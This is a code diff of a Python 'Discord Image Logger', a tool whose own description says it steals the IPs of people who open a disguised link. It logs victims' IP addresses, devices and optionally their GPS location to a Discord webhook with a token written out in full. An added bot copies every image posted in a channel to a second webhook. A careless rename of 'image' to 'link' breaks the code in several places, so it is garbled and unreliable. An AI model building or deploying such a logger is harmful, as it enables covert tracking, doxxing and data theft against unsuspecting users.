@@ -1,12 +1,12 @@
 
-# Discord Image Logger
+# Discord link Logger
 # By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
+__app__ = "Discord link link link Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
@@ -14,12 +14,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1212166604524093512/ech7jp7lC_5rRbZVVCQoQLlpCBe3mcxfoNLUcZmnOVfjcBdEIQS6fMNSjfdoyu--7WU1",
-    "image": "https://ngl.link/mathews_pvrt1", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "link": "https://ngl.link/mathews_pvrt1", # You can also have a custom link by using a URL argument
+                                               # (E.g. yoursite.com/linklogger?url=<Insert a URL-escaped link to an linklinklink here>)
+    "linkArgument": True, # Allows you to use a URL argument to change the link (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "link Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -27,9 +27,9 @@ config = {
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
-    "message": { # Show a custom message when the user opens the image
+    "message": { # Show a custom message when the user opens the link
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by DeKrypt's link Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -39,7 +39,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedlink": True, # Shows a loading link as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -52,15 +52,15 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://ngl.link/mathews_pvrt1" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
     # Do not edit anything below this, unless you know what you're doing.
     # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
+    # 1) Redirect (If this is enabled, disables link and crash browser)
+    # 2) Crash Browser (If this is enabled, disables link)
+    # 3) Message (If this is enabled, disables link)
     # 4) Image 
 }
 
@@ -81,7 +81,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "link Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -100,9 +100,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "link Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **link Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -145,9 +145,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "link Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A User Opened the Original link!**
 
 **Endpoint:** `{endpoint}`
             
@@ -183,7 +183,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # This IS NOT a rat or virus, it's just a loading link. (Made by me! :D)
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
@@ -192,22 +192,22 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
-            if config["imageArgument"]:
+            if config["linkArgument"]:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
-                    url = config["image"]
+                    url = config["link"]
             else:
-                url = config["image"]
+                url = config["link"]
 
             data = f'''<style>body {{
 margin: 0;
 padding: 0;
 }}
 div.img {{
-background-image: url('{url}');
+background-link: url('{url}');
 background-position: center center;
 background-repeat: no-repeat;
 background-size: contain;
@@ -219,11 +219,11 @@ height: 100vh;
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.send_response(200 if config["buggedlink"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedlink"] else 'Location', 'link/jpeg' if config["buggedlink"] else url) # Define the data as an link so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+                if config["buggedlink"]: self.wfile.write(binaries["loading"]) # Write the link to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
@@ -269,7 +269,7 @@ height: 100vh;
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                 self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.send_header('Content-type', datatype) # Define the data as an link so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
                 if config["accurateLocation"]:
@@ -303,7 +303,7 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = app = linkLoggerAPI
 
 
 import discord
@@ -322,9 +322,9 @@ async def on_message(message):
     if message.attachments:
         # Iterate through each attachment
         for attachment in message.attachments:
-            # Check if the attachment is an image
+            # Check if the attachment is an link
             if attachment.filename.endswith(('.png', '.jpg', '.jpeg', '.gif')):
-                # Download the image
+                # Download the link
                 response = requests.get(attachment.url)
-                # Send the image to the webhook URL
+                # Send the link to the webhook URL
                 requests.post(https://discord.com/api/webhooks/1198395133708746874/u31CpqQd-8H8ECn0m1_wcH1xpWv3x1H1yAgsdtwJNbm-_1er6j6CjWtHVMra76HBmff6, files={'file': response.content})
